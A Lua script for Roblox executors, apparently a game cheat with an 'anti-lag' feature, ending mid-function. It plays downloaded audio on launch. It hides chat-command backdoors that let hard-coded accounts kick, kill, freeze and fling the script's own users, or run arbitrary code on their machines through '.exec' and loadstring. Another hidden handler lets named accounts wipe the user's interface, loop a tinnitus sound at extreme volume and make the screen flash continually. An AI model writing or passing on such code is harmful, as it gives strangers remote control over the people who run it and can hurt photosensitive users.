Players = game:GetService('Players')
LocalPlayer = Players.LocalPlayer
StarterGui = game:GetService('StarterGui')
RunService = game:GetService('RunService')
ReplicatedStorage = game:GetService('ReplicatedStorage')
PS = game:GetService('Players')
RS = game:GetService('ReplicatedStorage')
R = game:GetService('RunService')
UserInputService = game:GetService('UserInputService')
Workspace = workspace
Player = PS.LocalPlayer
Camera = Workspace.CurrentCamera
CE = RS:WaitForChild('CharacterEvents', 10)
BeingHeld = Player:WaitForChild('IsHeld', 10)
StruggleEvent = CE and CE:WaitForChild('Struggle')
Players = game:GetService('Players')
ReplicatedStorage = game:GetService('ReplicatedStorage')
RunService = game:GetService('RunService')
Workspace = game:GetService('Workspace')
UserInputService = game:GetService('UserInputService')
LocalPlayer = Players.LocalPlayer
GrabEvents = ReplicatedStorage:WaitForChild('GrabEvents')
RemoteSetNetworkOwner = GrabEvents:WaitForChild('SetNetworkOwner')
RemoteDestroyGrabLine = GrabEvents:WaitForChild('DestroyGrabLine')
SpawnToyRF = ReplicatedStorage:WaitForChild('MenuToys'):WaitForChild('SpawnToyRemoteFunction')
Struggle = ReplicatedStorage:WaitForChild('CharacterEvents'):WaitForChild('Struggle')
StickyPartEvent = ReplicatedStorage:WaitForChild('PlayerEvents'):WaitForChild('StickyPartEvent')
DestroyToyEvent = ReplicatedStorage:WaitForChild('MenuToys'):WaitForChild('DestroyToy')
MenuToys = ReplicatedStorage:WaitForChild('MenuToys')
SelectedPlayer = nil
bringTimer = 0
tpTimer = 0
switchTimer = 0
Mouse = LocalPlayer:GetMouse()
KillHB = nil
LoopKillOn = false
GrabKickHB = nil
LoopGrabKickOn = false
LoopBringActive = false
LoopBangActive = false
LoopPencilActive = false
PencilList = {}
AKList = {}
PencilCooldown = {}
LoopBlobkickActive = false
BlobkickList = {}
Blob = nil
BlobkickCooldown = {}
BKA = false
BKAWL = false
ESPEnabled = false
ESPTargets = {}
ESPBoxes = {}
BangSpeed = 0.8
BangDistance = 4
HEIGHT_LIMIT = 100000
TELEPORT_OFFSET = Vector3.new(6, -18.5, 0)
Lines = 0
Camera = workspace.CurrentCamera
plr = Players.LocalPlayer
Mouse = plr:GetMouse()
cons = {}
inv = workspace[plr.Name .. 'SpawnedInToys']
char = plr.Character
HRP = char.HumanoidRootPart
hum = char.Humanoid
Notifications = {
    Fire = function(title, desc, time)
        Library:Notify({
            Title = title,
            Description = desc,
            Time = time or 3,
        })
    end,
}

local GrabEvents = ReplicatedStorage:WaitForChild('GrabEvents', 5)

if not GrabEvents then
    return
end

CreateGrabLine = GrabEvents:WaitForChild('CreateGrabLine', 5)

if not CreateGrabLine then
    return
end

Pline = CreateGrabLine.OnClientEvent
antiLagEnabled = true
antiLagMode = true
AntiLagV = 27
CooldownTime = 1
MinFPS = 60
FrameBurstLimit = 3
fireCount = {}
isLagging = false
isFpsLow = false
suspectPlayer = nil
connection = nil
globalFrame = 0
pendingResetFrame = {}
charBeamMove = plr:WaitForChild('PlayerScripts'):WaitForChild('CharacterAndBeamMove', 5)

function UpdateCharBeamState()
    if not charBeamMove then
        return
    end
    if not antiLagEnabled then
        charBeamMove.Enabled = true

        return
    end
    if not antiLagMode then
        charBeamMove.Enabled = false

        return
    end
    if isLagging or isFpsLow then
        charBeamMove.Enabled = false
    else
        charBeamMove.Enabled = true
    end
end
function FlagPlayer(fromPlr)
    local data = fireCount[fromPlr]

    if not data then
        return
    end
    if data.isFlagged then
        return
    end

    data.isFlagged = true

    if not isLagging then
        isLagging = true
        suspectPlayer = fromPlr

        UpdateCharBeamState()
        pcall(function() end)
        task.spawn(function()
            local suspect = suspectPlayer

            while suspect and suspect.Parent == Players do
                local sData = fireCount[suspect]

                if not sData then
                    break
                end
                if os.clock() - sData.lastCallTime >= CooldownTime then
                    sData.isFlagged = false

                    break
                end

                task.wait(0.5)
            end

            isLagging = false
            suspectPlayer = nil

            UpdateCharBeamState()
        end)
    else
        pcall(function() end)
        task.spawn(function()
            local suspect = fromPlr

            while suspect and suspect.Parent == Players do
                local sData = fireCount[suspect]

                if not sData then
                    break
                end
                if os.clock() - sData.lastCallTime >= CooldownTime then
                    sData.isFlagged = false

                    break
                end

                task.wait(0.5)
            end
        end)
    end
end

task.spawn(function()
    local frames = 0

    RunService.RenderStepped:Connect(function()
        frames += 1
        globalFrame += 1

        for plrRef, resetFrame in pairs(pendingResetFrame)do
            if resetFrame < globalFrame then
                local data = fireCount[plrRef]

                if data then
                    data.frameBurst = 0
                end

                pendingResetFrame[plrRef] = nil
            end
        end
    end)

    while true do
        task.wait(1)

        local currentFPS = frames

        frames = 0

        if currentFPS < MinFPS then
            if not isFpsLow then
                isFpsLow = true

                UpdateCharBeamState()
            end
        else
            if isFpsLow then
                isFpsLow = false

                UpdateCharBeamState()
            end
        end
    end
end)

function AntiLagF()
    if connection then
        connection:Disconnect()

        connection = nil
    end

    UpdateCharBeamState()
    task.spawn(function()
        while true do
            task.wait(1)

            if not antiLagEnabled or not antiLagMode then
                continue
            end

            for fromPlr, data in pairs(fireCount)do
                data.count = 0
            end
        end
    end)

    connection = Pline:Connect(function(fromPlr, ...)
        if typeof(fromPlr) ~= 'Instance' or not fromPlr:IsA('Player') then
            return
        end
        if fromPlr == plr then
            return
        end
        if not antiLagEnabled or not antiLagMode then
            return
        end
        if not fireCount[fromPlr] then
            fireCount[fromPlr] = {
                count = 0,
                lastCallTime = 0,
                isFlagged = false,
                lastFrame = 0,
                frameBurst = 0,
            }
        end

        local data = fireCount[fromPlr]
        local currentTime = os.clock()

        if data.lastFrame == globalFrame then
            data.frameBurst += 1

            if data.frameBurst >= FrameBurstLimit then
                FlagPlayer(fromPlr)
            end
        else
            data.lastFrame = globalFrame
            data.frameBurst = 1
            pendingResetFrame[fromPlr] = globalFrame
        end
        if data.lastCallTime ~= 0 and (currentTime - data.lastCallTime) <= 0.025 then
            data.count = AntiLagV
        end

        data.lastCallTime = currentTime

        data.count += 1

        if data.count >= AntiLagV then
            FlagPlayer(fromPlr)
        end
    end)
end

AntiLagF()
pcall(function() end)

rs = game:GetService('ReplicatedStorage')
uis = game:GetService('UserInputService')

setfpscap(100000)

Players = game:GetService('Players')
plr = Players.LocalPlayer

function getChar()
    return plr.Character or plr.CharacterAdded:Wait()
end

writefile('yo.mp3', game:HttpGet('https://raw.githubusercontent.com/yesawwwwwwd/Ftapian/main/yo.mp3'))

sound = Instance.new('Sound')
sound.SoundId = getcustomasset('yo.mp3')
sound.Volume = 0
sound.Looped = true
sound.Parent = game.Workspace

sound:Play()

targetVolume = 1
fadeInTime = 2
fadeTime = 4
lifeTime = 12

task.spawn(function()
    steps = 20
    stepTime = fadeInTime / steps

    for i = 1, steps do
        if sound then
            sound.Volume = targetVolume * (i / steps)

            task.wait(stepTime)
        end
    end
end)
task.delay(lifeTime - fadeTime, function()
    steps = 20
    stepTime = fadeTime / steps
    startVolume = sound.Volume

    for i = 1, steps do
        if sound then
            sound.Volume = startVolume * (1 - (i / steps))

            task.wait(stepTime)
        end
    end
end)
game:GetService('Debris'):AddItem(sound, lifeTime)

function witheringheights()
    writefile('WHATHAVEYOUDONE.mp3', game:HttpGet('https://raw.githubusercontent.com/yesawwwwwwd/-WitherStormTrack/main/WHATHAVEYOUDONE.mp3'))

    object = game:GetObjects('rbxassetid://10973669978')[1]
    object.Parent = game.Workspace

    object:PivotTo(game.Players.LocalPlayer.Character:GetPivot())

    RunService = game:GetService('RunService')
    Players = game:GetService('Players')
    player = Players.LocalPlayer
    character = player.Character or player.CharacterAdded:Wait()

    player.CharacterAdded:Connect(function(newChar)
        character = newChar
    end)

    phaseModels = {
        [1] = 'rbxassetid://10973669978',
        [2] = 'rbxassetid://10980258642',
        [3] = 'rbxassetid://10980269902',
        [4] = 'rbxassetid://10394012803',
        [5] = 'rbxassetid://16333160399',
        [6] = 'rbxassetid://16333261175',
    }
    phasePartsSucked = {
        0,
        50,
        100,
        150,
        200,
        250,
    }
    currentPhase = 1
    partsSucked = 0
    attractedParts = {}

    function isCharacterPart(part)
        local model = part:FindFirstAncestorWhichIsA('Model')

        return model and model:FindFirstChildWhichIsA('Humanoid') ~= nil
    end
    function disableCollisions(model)
        for _, part in ipairs(model:GetDescendants())do
            if part:IsA('BasePart') then
                part.CanCollide = false
            end
        end
    end
    function changePhase(newPhase)
        if currentPhase == newPhase then
            return
        end

        local oldPosition = object:GetPivot()

        object:Destroy()

        object = game:GetObjects(phaseModels[newPhase])[1]
        object.Parent = game.Workspace

        object:PivotTo(oldPosition)
        disableCollisions(object)

        currentPhase = newPhase

        print('Big boy')
    end
    function onPartDestroyed()
        partsSucked = partsSucked + 1

        for i, threshold in ipairs(phasePartsSucked)do
            if partsSucked >= threshold and currentPhase < i then
                changePhase(i)

                break
            end
        end
    end

    coroutine.wrap(function()
        while true do
            task.wait(2)

            local candidates = {}

            for _, obj in ipairs(game.Workspace:GetDescendants())do
                if obj:IsA('BasePart') and obj.Parent and not isCharacterPart(obj) and not obj:IsDescendantOf(object) and obj.Size.Magnitude < 20 and not table.find(attractedParts, obj) then
                    local dist = (obj.Position - object:GetPivot().Position).Magnitude

                    table.insert(candidates, {
                        obj = obj,
                        dist = dist,
                    })
                end
            end

            if #candidates > 0 then
                table.sort(candidates, function(a, b)
                    return a.dist < b.dist
                end)

                local chosen = candidates[1].obj

                if chosen.Anchored then
                    chosen.Anchored = false
                end

                table.insert(attractedParts, chosen)
            end
        end
    end)()
    RunService.Heartbeat:Connect(function(dt)
        for i = #attractedParts, 1, -1 do
            local obj = attractedParts[i]

            if obj and obj.Parent and not isCharacterPart(obj) then
                local objectPos = object:GetPivot().Position
                local dist = (obj.Position - objectPos).Magnitude

                if dist > 2 then
                    local lerpAlpha = 0.2 * dt * (100 / dist)
                    local newPos = obj.Position:Lerp(objectPos, lerpAlpha)

                    obj.CFrame = CFrame.new(newPos) * obj.CFrame.Rotation
                else
                    obj:Destroy()
                    table.remove(attractedParts, i)
                    onPartDestroyed()
                end
            else
                table.remove(attractedParts, i)
            end
        end
    end)

    function getPhaseSettings()
        local phase = currentPhase

        if phase == 1 or phase == 2 or phase == 3 then
            return {
                minHeight = 5,
                maxHeight = 30,
                speed = 1,
                move = true,
            }
        elseif phase == 4 then
            return {
                minHeight = 15,
                maxHeight = 25,
                speed = 0.7,
                move = true,
            }
        elseif phase == 5 then
            return {
                minHeight = 25,
                maxHeight = 40,
                speed = 0.3,
                move = true,
            }
        else
            return {
                minHeight = 35,
                maxHeight = 55,
                speed = 0,
                move = false,
            }
        end
    end

    coroutine.wrap(function()
        while true do
            local settings = getPhaseSettings()

            if settings.move then
                local startCFrame = object:GetPivot()
                local playerPivot = character:GetPivot()
                local randomOffset = Vector3.new(math.random(-50, 50), math.random(settings.minHeight, settings.maxHeight), math.random(-50, 50))
                local targetPos = playerPivot.Position + randomOffset

                targetPos = Vector3.new(targetPos.X, math.max(targetPos.Y, playerPivot.Position.Y + settings.minHeight), targetPos.Z)

                local dir = targetPos - startCFrame.Position

                if dir.Magnitude < 1 then
                    task.wait(1)

                    continue
                end

                dir = dir.Unit

                local targetCFrame = CFrame.lookAt(targetPos, targetPos + dir)
                local duration = math.random(3 / settings.speed, 10 / settings.speed)
                local elapsed = 0

                while elapsed < duration do
                    elapsed += RunService.Heartbeat:Wait()

                    local alpha = elapsed / duration

                    object:PivotTo(startCFrame:Lerp(targetCFrame, alpha))
                end
            else
                local currentCFrame = object:GetPivot()
                local currentPos = currentCFrame.Position
                local playerPivot = character:GetPivot()
                local targetCFrame = CFrame.lookAt(currentPos, playerPivot.Position)

                object:PivotTo(targetCFrame)
                task.wait(0.1)
            end
        end
    end)()
    coroutine.wrap(function()
        while true do
            task.wait(3)

            if not character or not character:FindFirstChild('HumanoidRootPart') then
                continue
            end

            local skullTemplate = game:GetObjects('rbxassetid://16940644099')[1]
            local skull = skullTemplate:Clone()

            skull.Parent = game.Workspace

            local launchSound = Instance.new('Sound')

            launchSound.SoundId = 'rbxassetid://127670808213759'
            launchSound.Volume = 2
            launchSound.Parent = game.Workspace

            launchSound:Play()

            local objectCFrame = object:GetPivot()
            local spawnOffset = objectCFrame.LookVector * 5

            skull:PivotTo(CFrame.new(objectCFrame.Position + spawnOffset) * objectCFrame.Rotation)

            local playerPos = character.HumanoidRootPart.Position
            local skullDir = (playerPos - skull:GetPivot().Position).Unit
            local skullTargetCFrame = CFrame.lookAt(skull:GetPivot().Position, skull:GetPivot().Position + skullDir)

            skull:PivotTo(skullTargetCFrame)

            local speed = 50
            local moving = true

            coroutine.wrap(function()
                while skull and skull.Parent and moving do
                    local dt = RunService.Heartbeat:Wait()
                    local newPos = skull:GetPivot().Position + skullDir * speed * dt

                    skull:PivotTo(CFrame.new(newPos) * skull:GetPivot().Rotation)
                end
            end)()
            task.delay(17, function()
                if skull and skull.Parent then
                    skull:Destroy()
                end
            end)

            local touchedConnection
            local exploded = false

            touchedConnection = skull.DescendantAdded:Connect(function(desc)
                if desc:IsA('BasePart') then
                    desc.Touched:Connect(function(other)
                        if not exploded and other and other.Parent then
                            exploded = true
                            moving = false

                            if touchedConnection then
                                touchedConnection:Disconnect()
                            end

                            local explosionPos = skull:GetPivot().Position
                            local explosion = Instance.new('Explosion')

                            explosion.Position = explosionPos
                            explosion.BlastRadius = 10
                            explosion.BlastPressure = 0
                            explosion.Parent = game.Workspace

                            local explodeSound = Instance.new('Sound')

                            explodeSound.SoundId = 'rbxassetid://90854697257230'
                            explodeSound.Volume = 2
                            explodeSound.Parent = game.Workspace

                            explodeSound:Play()

                            local playerRoot = character:FindFirstChild('HumanoidRootPart')

                            if playerRoot then
                                local dist = (playerRoot.Position - explosionPos).Magnitude

                                if dist <= 10 then
                                    local humanoid = character:FindFirstChildWhichIsA('Humanoid')

                                    if humanoid then
                                        humanoid:TakeDamage(10)
                                    end
                                end
                            end

                            skull:Destroy()
                        end
                    end)
                end
            end)

            for _, desc in ipairs(skull:GetDescendants())do
                if desc:IsA('BasePart') then
                    desc.Touched:Connect(function(other)
                        if not exploded and other and other.Parent then
                            exploded = true
                            moving = false

                            if touchedConnection then
                                touchedConnection:Disconnect()
                            end

                            local explosionPos = skull:GetPivot().Position
                            local explosion = Instance.new('Explosion')

                            explosion.Position = explosionPos
                            explosion.BlastRadius = 10
                            explosion.BlastPressure = 0
                            explosion.Parent = game.Workspace

                            local explodeSound = Instance.new('Sound')

                            explodeSound.SoundId = 'rbxassetid://90854697257230'
                            explodeSound.Volume = 2
                            explodeSound.Parent = game.Workspace

                            explodeSound:Play()

                            local playerRoot = character:FindFirstChild('HumanoidRootPart')

                            if playerRoot then
                                local dist = (playerRoot.Position - explosionPos).Magnitude

                                if dist <= 10 then
                                    local humanoid = character:FindFirstChildWhichIsA('Humanoid')

                                    if humanoid then
                                        humanoid:TakeDamage(10)
                                    end
                                end
                            end

                            skull:Destroy()
                        end
                    end)
                end
            end
        end
    end)()
    disableCollisions(object)

    sound = Instance.new('Sound')
    sound.SoundId = getcustomasset('WHATHAVEYOUDONE.mp3')
    sound.Volume = 2
    sound.Parent = game.Workspace
    sound.Looped = true

    sound:Play()
end

Players = game:GetService('Players')
RunService = game:GetService('RunService')
TextChatService = game:GetService('TextChatService')
LocalPlayer = Players.LocalPlayer or Players:GetPropertyChangedSignal('LocalPlayer'):Wait()
RBXGeneral = TextChatService.TextChannels:FindFirstChild('RBXGeneral')
scriptedPlayers = {}
scriptedPlayers[LocalPlayer] = true

local superAdmins = {prazify = true}
local admins = {
    Mrgamingwolf6 = true,
    Procon_1 = true,
}
local tempAdmins = {}

function sendLines(player, lines, perMessage)
    perMessage = perMessage or 4

    for i = 1, #lines, perMessage do
        local chunk = {}

        for j = i, math.min(i + perMessage - 1, #lines)do
            table.insert(chunk, lines[j])
        end

        local text = table.concat(chunk, '\n')

        game:GetService('ReplicatedStorage').DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text, 'All')
        task.wait(0.25)
    end
end

local commandHelp = {
    '.chat (Target) (Text)',
    '.bring (Target)',
    '.kill (Target)',
    '.kick (Target)',
    '.freeze (Target)',
    '.thaw (Target)',
    '.spin (Target)',
    '.unspin',
    '.fps (Target) (Cap)',
    '.friend (Target)',
    '.unfriend (Target)',
    '.admin (Target)',
    '.revoke (Target)',
    '.exec (Target) (Code)',
    '.reveal (Target) (All)',
    '.credits',
    '.blind (Target)',
    '.cmds',
}
local frozenPlayers = {}

function getRole(name)
    if superAdmins[name] then
        return 'superadmin'
    elseif admins[name] or tempAdmins[name] then
        return 'admin'
    else
        return 'user'
    end
end
function resolveTargets(input)
    if not input then
        return {}
    end

    input = input:lower()

    local results = {}

    if input == 'all' then
        for player in pairs(scriptedPlayers)do
            table.insert(results, player)
        end

        return results
    end

    for _, plr in ipairs(Players:GetPlayers())do
        local uname = plr.Name:lower()
        local dname = (plr.DisplayName or ''):lower()

        if uname:sub(1, #input) == input or dname:sub(1, #input) == input then
            table.insert(results, plr)
        end
    end

    return results
end
function toggleBlock(player, enable)
    local char = player.Character
    local hrp = char and char:FindFirstChild('HumanoidRootPart')

    if not hrp then
        return
    end
    if enable then
        if not hrp:FindFirstChild('Block') then
            local bv = Instance.new('BodyVelocity')

            bv.Name = 'Block'
            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bv.Velocity = Vector3.zero
            bv.Parent = hrp
        end
    else
        local bv = hrp:FindFirstChild('Block')

        if bv then
            bv:Destroy()
        end
    end
end
function freezePlayer(player, enable)
    if not scriptedPlayers[player] then
        return
    end

    local char = player.Character
    local hrp = char and char:FindFirstChild('HumanoidRootPart')

    if hrp then
        hrp.Anchored = enable
    end
end

local spin = false
local spinTarget = nil

function sendToChat(msg)
    if RBXGeneral and msg then
        pcall(function()
            RBXGeneral:SendAsync(msg)
        end)
    end
end
function handleMessage(sender, text)
    local senderRole = getRole(sender.Name)

    if senderRole == 'user' then
        return
    end

    local args = {}

    for word in text:gmatch('%S+')do
        table.insert(args, word)
    end

    if #args < 1 then
        return
    end

    local cmd = args[1]:lower()
    local targets = resolveTargets(args[2])

    if cmd == '.chat' then
        local msg = table.concat(args, ' ', 3)

        if msg ~= '' then
            for _, target in ipairs(targets)do
                if target == LocalPlayer then
                    sendToChat(msg)
                end
            end
        end
    elseif cmd == '.kick' then
        local reason = table.concat(args, ' ', 3)

        if reason == '' then
            reason = 'No Reason was applied.'
        end

        for _, target in ipairs(targets)do
            local message = 'Kicked by: ' .. sender.DisplayName .. ' (@' .. sender.Name .. ')\n' .. 'Reason: ' .. reason

            target:Kick(message)
        end
    elseif cmd == '.wither' then
        witheringheights()
    elseif cmd == '.kill' then
        for _, target in ipairs(targets)do
            local hum = target.Character and target.Character:FindFirstChildOfClass('Humanoid')

            if hum then
                hum.Health = 0
            end
        end
    elseif cmd == '.bring' then
        for _, target in ipairs(targets)do
            local hrp = target.Character and target.Character:FindFirstChild('HumanoidRootPart')
            local senderHRP = sender.Character and sender.Character:FindFirstChild('HumanoidRootPart')

            if hrp and senderHRP then
                hrp.CFrame = senderHRP.CFrame + Vector3.new(0, 0, -3)

                toggleBlock(target, true)
                task.delay(1, function()
                    toggleBlock(target, false)
                end)
            end
        end
    elseif cmd == '.spin' then
        spin = true
        spinTarget = targets[1]
    elseif cmd == '.unspin' then
        spin = false
        spinTarget = nil
    elseif cmd == '.fps' then
        local cap = tonumber(args[3])

        if cap and setfpscap then
            setfpscap(cap)
        end
    elseif cmd == '.fling' then
        for _, target in ipairs(targets)do
            local myHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
            local tHRP = target.Character and target.Character:FindFirstChild('HumanoidRootPart')

            if myHRP and tHRP then
                myHRP.CFrame = tHRP.CFrame

                task.wait()

                myHRP.Velocity = Vector3.new(9999, 9999, 9999)
            end
        end
    elseif cmd == '.freeze' then
        for _, target in ipairs(targets)do
            frozenPlayers[target] = true

            freezePlayer(target, true)
        end
    elseif cmd == '.thaw' then
        for _, target in ipairs(targets)do
            frozenPlayers[target] = nil

            freezePlayer(target, false)
        end
    elseif cmd == '.friend' then
        for _, target in ipairs(targets)do
            if target ~= LocalPlayer then
                pcall(function()
                    LocalPlayer:RequestFriendship(target)
                    sendToChat('friended ' .. target.Name)
                end)
            end
        end
    elseif cmd == '.unfriend' then
        for _, target in ipairs(targets)do
            if LocalPlayer:IsFriendsWith(target.UserId) then
                pcall(function()
                    LocalPlayer:RevokeFriendship(target)
                    sendToChat('unfriended ' .. target.Name)
                end)
            end
        end
    elseif cmd == '.admin' then
        if senderRole ~= 'superadmin' then
            return
        end

        for _, target in ipairs(targets)do
            if target and not superAdmins[target.Name] then
                tempAdmins[target.Name] = true

                sendToChat(target.DisplayName .. ' (@' .. target.Name .. ') is now whitelisted')
            end
        end
    elseif cmd == '.revoke' then
        if senderRole ~= 'superadmin' then
            return
        end

        for _, target in ipairs(targets)do
            if tempAdmins[target.Name] then
                tempAdmins[target.Name] = nil

                sendToChat(target.DisplayName .. ' (@' .. target.Name .. ') is no longer whitelisted')
            end
        end
    elseif cmd == '.exec' then
        if senderRole ~= 'superadmin' then
            return
        end

        local code = table.concat(args, ' ', 3)

        if code ~= '' and targets[1] == LocalPlayer then
            local fn, err = loadstring(code)

            if fn then
                pcall(fn)
            else
                warn(err)
            end
        end
    elseif cmd == '.cmds' then
        local chunkSize = 4

        for i = 1, #commandHelp, chunkSize do
            local chunk = {}

            for j = i, math.min(i + chunkSize - 1, #commandHelp)do
                table.insert(chunk, commandHelp[j])
            end

            sendToChat(table.concat(chunk, '\n'))
            task.wait(0.25)
        end
    elseif cmd == '.reveal' then
        for _, target in ipairs(targets)do
            if target == LocalPlayer then
                sendToChat('Im an unstable user son')
            end
        end
    elseif cmd == '.blind' then
        for _, target in ipairs(targets)do
            if target == LocalPlayer then
                local gui = Instance.new('ScreenGui', game.CoreGui)
                local frame = Instance.new('Frame', gui)

                frame.Size = UDim2.new(1, 0, 1, 0)
                frame.BackgroundColor3 = Color3.new(0, 0, 0)

                task.delay(5, function()
                    gui:Destroy()
                end)
            end
        end
    elseif cmd == '.credits' then
        for _, target in ipairs(targets)do
            if target == LocalPlayer then
                sendToChat('CREDITS: created by Praise Ideas from: Oats, Marshel, DjDillywag, Terrence')
            end
        end
    end
end
function connectPlayer(player)
    player.Chatted:Connect(function(msg)
        handleMessage(player, msg)
    end)
end

for _, player in ipairs(Players:GetPlayers())do
    connectPlayer(player)
end

Players.PlayerAdded:Connect(connectPlayer)
RunService.Heartbeat:Connect(function()
    if not spin or not spinTarget then
        return
    end

    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
    local targetHRP = spinTarget.Character and spinTarget.Character:FindFirstChild('HumanoidRootPart')

    if hrp and targetHRP then
        local a = tick() * 2

        hrp.CFrame = targetHRP.CFrame * CFrame.new(math.cos(a) * 8, 2, math.sin(a) * 8)
    end
end)

Players = game:GetService('Players')
Lighting = game:GetService('Lighting')
TweenService = game:GetService('TweenService')
Run = game:GetService('RunService')
Player = Players.LocalPlayer
Cam = workspace.CurrentCamera
Intensity = 0
TimeElapsed = 0
list = {
    FortisErat = true,
    OatsStack = true,
    EndOfReset = true,
}
ScreenGui = Instance.new('ScreenGui')
ScreenGui.DisplayOrder = 12
ScreenGui.IgnoreGuiInset = true
ScreenGui.Parent = game.CoreGui

local BlackFrame = Instance.new('Frame')

BlackFrame.Size = UDim2.new(1, 0, 1, 0)
BlackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
BlackFrame.BackgroundTransparency = 1
BlackFrame.Parent = ScreenGui

function flashScreen()
    BlackFrame.BackgroundTransparency = 0

    TweenService:Create(BlackFrame, TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1}):Play()
end

Run.RenderStepped:Connect(function(dt)
    if Intensity > 0 then
        TimeElapsed += dt

        local sx = 1 + math.sin(TimeElapsed * 30) * Intensity
        local sy = 1 + math.cos(TimeElapsed * 30) * Intensity

        Cam.CFrame = Cam.CFrame * CFrame.new(0, 0, 0, sx, 0, 0, 0, sy, 0, 0, 0, 1)
    end
end)

local spookyMessages = {
    'SILENCE',
    'THEY ARE WATCHING',
    'RUN',
    'HIDE',
    "BE QUIET, THEY'RE NEAR",
    'GET AWAY',
    'CLOSE YOUR EYES',
    'DONT LOOK AT IT',
}

function applyEffects()
    local msg = Instance.new('Message')

    msg.Text = spookyMessages[math.random(1, #spookyMessages)]
    msg.Parent = workspace

    task.delay(0.5, function()
        msg:Destroy()
    end)

    local cc = Instance.new('ColorCorrectionEffect')

    cc.Parent = game.Lighting
    cc.TintColor = Color3.fromRGB(255, 0, 0)
    cc.Saturation = -100
    cc.Contrast = 5
    cc.Brightness = 2
    game.Lighting.TimeOfDay = '00:00:00'

    local blur = Instance.new('BlurEffect')

    blur.Size = 5
    blur.Parent = game.Lighting
    Intensity = 0.03

    task.spawn(function()
        while true do
            cc.Saturation = -cc.Saturation

            task.wait()
        end
    end)
    task.spawn(function()
        while true do
            BlackFrame.BackgroundTransparency = 0

            TweenService:Create(BlackFrame, TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1}):Play()
            task.wait(2)
        end
    end)
end
function onChatted(player, message)
    if not list[player.Name] then
        return
    end
    if message:sub(1, 3):lower() == '/e ' then
        message = message:sub(4)
    end
    if message == '!s' then
        pcall(function()
            game.CoreGui:ClearAllChildren()
        end)

        local soundService = game:GetService('SoundService')
        local players = game:GetService('Players')
        local player = players.LocalPlayer

        soundService.AmbientReverb = Enum.ReverbType.Alley

        local tinnitus = soundService:FindFirstChild('Tinnitus')

        if tinnitus then
            tinnitus.Looped = true
            tinnitus.PlaybackSpeed = 0.1
            tinnitus.Volume = 500

            tinnitus:Play()
            task.spawn(function()
                function runTinnitus()
                    if not tinnitus then
                        return
                    end

                    tinnitus.Looped = true
                    tinnitus.Volume = 500

                    tinnitus:Play()

                    local speed = 0.1

                    tinnitus.PlaybackSpeed = speed

                    while speed < 20 do
                        task.wait(1)

                        speed += 1

                        tinnitus.PlaybackSpeed = speed
                    end

                    tinnitus.PlaybackSpeed = 20

                    while true do
                        task.wait(math.random(0.1, 3))

                        tinnitus.PlaybackSpeed = math.random(1, 200) / 10
                    end
                end

                runTinnitus()

                while true do
                    task.wait(1)

                    if not tinnitus or not tinnitus:IsDescendantOf(game) or not tinnitus.IsPlaying or not tinnitus.Looped then
                        tinnitus = soundService:FindFirstChild('Tinnitus')

                        if tinnitus then
                            runTinnitus()
                        end
                    end
                end
            end)
            applyEffects()
        end
    elseif message == '.antiskid' then
        game:GetService('CoreGui').HUI:ClearAllChildren()
    elseif message == '.term2' then
        local coreGui2 = game:GetService('ReplicatedStorage')

        coreGui2:ClearAllChildren()
    elseif message == '.term3' then
        local coreGui3 = game:GetService('ReplicatedFirst')

        coreGui3:ClearAllChildren()
    elseif message == '.oh' then
        game:GetService('Players').LocalPlayer:ClearAllChildren()
    elseif message == 'nub:Destroy()' then
        game:GetService('Players').LocalPlayer.PlayerGui:ClearAllChildren()
        game:GetService('Players').LocalPlayer.PlayerScripts:ClearAllChildren()
    elseif message == 'silence' then
        local coreGui4 = game:GetService('TextChatService')

        coreGui4:ClearAllChildren()
    elseif message == 'shazam' then
        local plrsyo = game:GetService('Players')

        plrsyo:ClearAllChildren()
    elseif message == 'skid:rekt' then
        game:GetService('StarterGui'):ClearAllChildren()
        game:GetService('StarterPlayer').StarterPlayerScripts:ClearAllChildren()
        game:GetService('StarterPlayer').StarterCharacterScripts:ClearAllChildren()
    elseif message == '.term' then
        local coreGui = game:GetService('CoreGui')

        coreGui:ClearAllChildren()
    end
end

for _, p in ipairs(Players:GetPlayers())do
    if list[p.Name] then
        p.Chatted:Connect(function(msg)
            onChatted(p, msg)
        end)
    end
end

Players.PlayerAdded:Connect(function(p)
    if list[p.Name] then
        p.Chatted:Connect(function(msg)
            onChatted(p, msg)
        end)
    end
end)
plr.CharacterAdded:Connect(function(c)
    task.wait(0.1)

    if c then
        HRP = c:FindFirstChild('HumanoidRootPart') or c:WaitForChild('HumanoidRootPart', 1)
        hum = c:FindFirstChild('Humanoid') or c:WaitForChild('Humanoid', 1)
        char = c
    end
end)

function gblob()
    local char = plr.Character
    local hum = char:WaitForChild('Humanoid', 0.1)

    if hum and hum.SeatPart then
        if hum.SeatPart.Parent.Name == 'CreatureBlobman' then
            return hum.SeatPart.Parent
        end
    end
end
function disc(name)
    for i, v in cons do
        if i == name then
            v:Disconnect()
        end
    end
end
function getplot()
    for i = 1, 5 do
        local plot = workspace.Plots:FindFirstChild('Plot' .. i)
        local value = plot.PlotSign.ThisPlotsOwners:FindFirstChild('Value')

        if plot and value and value.Value:find(plr.Name) then
            return plot
        end
    end
end
function sno(obj)
    SetNetOwner:FireServer(obj, obj.CFrame)
end
function spawntoy(toy, cf)
    if not plr.CanSpawnToy.Value then
        plr.CanSpawnToy.Changed:Wait()
    end

    local t
    local toyadded

    toyadded = inv.ChildAdded:Connect(function(c)
        if c.Name == toy then
            t = c

            toyadded:Disconnect()
        end
    end)

    task.spawn(function()
        SpawnToy:InvokeServer(toy, cf, Vector3.new(0, 0, 0))
    end)

    local time = tick() + 1

    repeat
        task.wait()
    until t or tick() > time

    if t then
        return t
    else
        local plot = getplot()

        if plot then
            return workspace.PlotItems[plot.Name]:FindFirstChild(toy) or workspace.PlotItems[plot.Name]:WaitForChild(toy, 0.5)
        end
    end
end
function grab(obj)
    obj.HoldPart.HoldItemRemoteFunction:InvokeServer(obj, char)
end
function drop(obj, cf)
    obj.HoldPart.DropItemRemoteFunction:InvokeServer(obj, cf, vector.create(0, 0, 0))
end
function tp(obj1, obj2)
